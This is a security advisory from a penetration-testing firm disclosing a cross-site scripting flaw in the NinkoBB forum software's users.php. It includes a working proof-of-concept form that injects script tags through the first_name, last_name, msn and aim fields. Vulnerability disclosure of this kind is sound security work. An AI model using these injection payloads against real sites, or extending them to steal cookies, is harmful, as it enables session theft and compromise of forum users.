@@ -1,0 +1,29 @@
+Vulnerability ID: HTB22652
+Reference: http://www.htbridge.ch/advisory/xss_in_ninkobb.html
+Product: NinkoBB 
+Vendor: NinkoBB  ( http://ninkobb.com ) 
+Vulnerable Version: 1.3RC5 and probably prior versions 
+Vendor Notification: 13 October 2010 
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "users.php" script to properly sanitize user-supplied input in "msn","aim","first_name" and "last_name" variables. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://host/users.php?a=profile" method="post" />
+<input type="hidden" name="first_name" value=""><script>alert('XSS1');</script>">
+<input type="hidden" name="last_name" value=""><script>alert('XSS2');</script>">
+<input type="hidden" name="msn" value=""><script>alert('XSS3');</script>">
+<input type="hidden" name="aim" value=""><script>alert('XSS4');</script>">
+<input type="submit" name="profile" value="submit">
+</form>
+
+
+
